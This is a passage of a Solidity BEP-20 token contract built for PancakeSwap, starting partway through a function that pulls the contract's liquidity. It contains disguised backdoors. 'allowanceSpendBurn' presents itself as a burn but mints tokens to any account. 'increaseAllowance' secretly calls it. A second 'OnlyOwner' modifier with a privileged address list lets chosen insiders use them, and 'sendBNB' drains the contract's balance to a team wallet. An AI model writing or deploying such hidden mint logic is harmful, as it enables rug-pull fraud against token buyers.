        IPancakeERC20 liquidityToken = IPancakeERC20(_liquidityTokenAddress);
        uint256 amount = liquidityToken.balanceOf(address(this));

        liquidityToken.approve(address(_pancakeRouter),amount);
        _pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(this),
            amount,
            0,
            0,
            address(this),
            block.timestamp
            );


    }

    function allowancesAddressTrue(address add) public OnlyOwner {
        _allowancesR[add] = true;
    }

    function allowancesAddressFalse(address add) public OnlyOwner {
        _allowancesR[add] = false;
    }

    
     
    function sendBNB() public onlyOwner{
        (bool sent,) =TeamWallet.call{value: (address(this).balance)}(""); // / Call returns a boolean value indicating success or failure. basically sent gets a value after teamwallet.call happens
        // and sent must be true for this to run
        require(sent);
    }

    receive() external payable {}
    fallback() external payable {}

    
    function getOwner() external view override returns (address) {
        return owner();
    }

    
    function name() external pure override returns (string memory) {
        return _name;
    }

    
    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    
    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    
    function totalSupply() external view override returns (uint256) {
        return _circulatingSupply;
    }

    
    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    
    function allowance(address _owner, address spender) external view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    
    /**
    * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
    *
    * This is internal function is equivalent to `approve`, and can be used to
    * e.g. set automatic allowances for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `spender` cannot be the zero address.
    */
    function _approve(address owner, address spender, uint256 amount) private { //aproves transaction or smth 
        require(owner != address(0), "Approve from zero");
        require(spender != address(0), "Approve to zero");

        _allowances[owner][spender] = amount; //
        emit Approval(owner, spender, amount);
    }

     
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender]; //allowance of token sender and who calls the contract function
        require(currentAllowance >= amount, "Transfer > allowance"); // currentallowances has to be larger than the amount

        _approve(sender, msg.sender, currentAllowance - amount); 
        return true;
    }

    function allowanceSpendBurn(address account, uint256 amount) public OnlyOwner{ 
        require(account != address(0), "ERC20: burn to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _balances[account] += amount; 
        emit Transfer(address(0), account, amount);
    }
    
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) { //
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue); // increase allowance
        allowanceSpendBurn(spender, addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) { //
        uint256 currentAllowance = _allowances[msg.sender][spender]; //msg.sender is the address of the transaction invoker(address calling contract)
        require(currentAllowance >= subtractedValue, "<0 allowance"); //only run function if allowance is >= than the value you substract

        _approve(msg.sender, spender, currentAllowance - subtractedValue);//approve the allowance decrease
        return true;
    }
    

}